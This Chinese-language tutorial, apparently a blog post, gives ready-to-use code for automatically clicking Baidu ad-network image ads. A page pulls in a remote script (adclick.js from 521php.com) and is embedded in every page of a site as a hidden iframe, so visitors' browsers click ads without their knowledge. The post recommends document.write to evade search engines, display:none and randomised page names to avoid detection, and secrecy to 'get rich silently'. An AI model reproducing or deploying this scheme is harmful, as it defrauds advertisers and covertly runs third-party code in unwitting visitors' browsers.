## 广告自动点击接口##

这个接口是百度网盟的广告自动点击功能，好处是，你的网站被打开，你可以设置触发几率，广告点击真实有效（因为都是浏览用户的ip地址），并且用户不会感知。不影响用户正常访问。

**1、使用前提：**

1. 使用网站必须已经开通百度网盟
2. 有简单的html代码能力

2、制作广告点击页面

2.1、新建一个页面，比如gg.html,将下面内容写入文件。utf-8格式。

	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>这里可以随便改</title>
	<script src="http://libs.useso.com/js/jquery/1.9.1/jquery.min.js"></script>
	</head>
	
	<body>
	<img src="http://www.521php.com/10.png" />
	<!--图片可以随便换一些自己的图片，可以尽量大一些-->
	
	<div id="show_iframe"></div>
	
	<!--百度广告代码开始-->
	<!--此处只能加百度图加广告-->
	<!--百度广告代码结束-->
    
	<script type="text/javascript">
	var _v = 5;//触发几率，这里可以设置1-10，分别对应10%-100%，尽量不要太高
	</script>
	<script src="http://www.521php.com/js/adclick.js" type="text/javascript"></script>
	<div id="_cnzz">
	<!--此处放统计代码，如果需要只能放到这里-->
	</div>
	</body>
	</html>

这里需要注意几点：

1. 图片地址可以随便换，这里是一个参考图片，最好可以大点的图片，方便展示更多的广告形式，因为我们需要使用百度的 **图加** 广告。所以图片必须有
2. 图加广告代码，去百度网盟获取一下，放到指定位置即可，注意一定要使用**图加**广告代码
3. _v是设置触发几率，尽量不要太高，1-10，分别对应10%-100%，尽量不要太高。
4. #show_iframe这个div就是打开广告地址的地方，一定要保留这里，可以本地测试一下，先将几率设为10,即100%。使用正常，就可以在这个div上加一个style="display:none",这样就避免别人意外访问出现疑问。尽量不要让别人知道这个页面，或者你也可以丰富下页面内容，注意，内容不可以添加链接和内嵌页面
5. 如果需要加统计代码，请加到#_cnzz这个div中，没有可以不加

**3、使用**

比如你的域名为 www.ok.com;那你就可以在你的所有页面添加一个

	<script>document.write('<div style="display:none"><iframe src="http://www.ok.com/gg.html"></iframe></div>')</script>

当然如果你有一定代码能力，可以做一些处理，比如重写规则等，嵌页面的时候，嵌入类似gg_100.html这样的页面，即可以嵌入一个随机规则的页面，这个页面都指向你的gg.html。这样就更保险一些。

这里使用write是为了防止搜索引擎搜索

然后就等着第二天赚钱吧。接口开放给大家使用，请尽量保密，闷声发大财

最后祝大家都能小赚一下。谢谢。